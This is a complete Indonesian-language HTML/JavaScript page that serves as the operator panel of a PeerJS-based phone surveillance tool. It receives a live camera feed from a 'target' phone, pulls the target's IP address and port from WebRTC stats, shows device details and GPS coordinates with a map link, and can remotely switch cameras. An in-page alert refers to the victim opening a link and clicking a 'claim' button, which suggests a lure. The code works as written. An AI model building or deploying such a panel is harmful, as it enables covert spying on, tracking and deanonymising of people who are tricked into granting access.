<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Panel Kontrol Kamera & Informasi Target</title>
  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
  <style>
    body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: white; padding: 20px; }
    video { width: 90%; max-width: 640px; border-radius: 10px; border: 2px solid #00ffcc; margin-top: 15px; background: #000; }
    button { padding: 12px 24px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
    button:hover { background: #0056b3; }
    .container { max-width: 700px; margin: 0 auto; }
    #infoBox { background: #2d2d2d; margin: 15px auto; padding: 15px; border-radius: 8px; color: #00ffcc; font-family: monospace; text-align: left; line-height: 1.6; word-break: break-all; border-left: 5px solid #00ffcc; }
    .btn-maps { display: inline-block; margin-top: 10px; padding: 10px 18px; background: #28a745; color: white; border-radius: 6px; text-decoration: none; font-weight: bold; font-family: sans-serif; }
    .btn-maps:hover { background: #218838; }
    .status-badge { display: inline-block; padding: 4px 10px; border-radius: 4px; font-size: 13px; font-weight: bold; background: #ffc107; color: #000; }
    .status-online { background: #28a745; color: #fff; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Layar Pantau Kamera & Data Target (Live)</h2>
    <p>Status Receiver Laptop: <span id="peerStatus" class="status-badge">Menghubungkan Server...</span></p>
    <button id="switchBtn">🔄 Ganti Kamera (Depan / Belakang)</button> <br>
    
    <video id="remoteVideo" autoplay playsinline muted></video>

    <!-- Kotak Panel Informasi -->
    <div id="infoBox">Status: Menunggu koneksi dari HP...</div>
  </div>

  <script>
    const ID_LAPTOP = "guru-demo-kamera-123";
    let activeDataConn = null;
    let ipTargetInfo = "Mencari IP...";
    let deviceInfoText = "Menunggu data perangkat...";
    let mapsButtonHtml = "<br><span style='color:#aaa;'>(Menunggu izin lokasi dari HP...)</span>";

    const peer = new Peer(ID_LAPTOP, {
      config: {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' }
        ]
      }
    });

    peer.on('open', (id) => {
      const badge = document.getElementById('peerStatus');
      badge.innerText = "SIAP (Online)";
      badge.className = "status-badge status-online";
    });

    peer.on('error', (err) => {
      if (err.type === 'unavailable-id') {
        alert("ID Laptop sedang tertahan di server PeerJS. Silakan muat ulang (refresh) halaman laptop ini dalam 5 detik.");
      }
    });

    function updateDisplay() {
      const infoBox = document.getElementById('infoBox');
      infoBox.innerHTML = `
        <strong>🌐 KONEKSI JARINGAN:</strong><br>
        ${ipTargetInfo}<br><br>
        <strong>📱 SPESIFIKASI PERANGKAT HP:</strong><br>
        ${deviceInfoText}<br>
        ${mapsButtonHtml}
      `;
    }

    // 1. Menangkap Streaming Video Kamera
    peer.on('call', (call) => {
      call.answer();
      call.on('stream', (remoteStream) => {
        const video = document.getElementById('remoteVideo');
        video.srcObject = remoteStream;
        
        // Memastikan video langsung berputar tanpa terhalang autoplay browser
        video.play().catch(err => console.log("Autoplay ditahan:", err));

        // Ambil data statistik IP Target
        setTimeout(() => {
          if (call.peerConnection) {
            call.peerConnection.getStats().then(stats => {
              stats.forEach(report => {
                if (report.type === 'remote-candidate' && report.ip) {
                  ipTargetInfo = `• IP Target: <strong>${report.ip}</strong><br>• Port: ${report.port}<br>• Tipe Jalur: ${report.candidateType}`;
                  updateDisplay();
                }
              });
            });
          }
        }, 1000);
      });
    });

    // 2. Menangkap Data Spesifikasi & Koordinat GPS
    peer.on('connection', (conn) => {
      activeDataConn = conn;

      conn.on('data', (data) => {
        if (data.type === 'device-info') {
          deviceInfoText = `
            • OS & Peramban: ${data.osBrowser}<br>
            • Layar: ${data.resolusi}<br>
            • CPU: ${data.cpuCore} Core | Estimasi RAM: ${data.ram}<br>
            • Zona Waktu: ${data.zonaWaktu}
          `;
          updateDisplay();
        }

        if (data.type === 'location-info') {
          mapsButtonHtml = `
            <a href="${data.mapsUrl}" target="_blank" class="btn-maps">
              🗺️ Buka Google Maps Lokasi HP (${data.lat.toFixed(4)}, ${data.lng.toFixed(4)})
            </a>
          `;
          updateDisplay();
        }
      });
    });

    // 3. Tombol Ganti Kamera
    document.getElementById('switchBtn').addEventListener('click', () => {
      if (activeDataConn && activeDataConn.open) {
        activeDataConn.send('switch');
      } else {
        alert("HP belum terhubung! Buka link di HP dan klik tombol klaim terlebih dahulu.");
      }
    });
  </script>
</body>
</html>
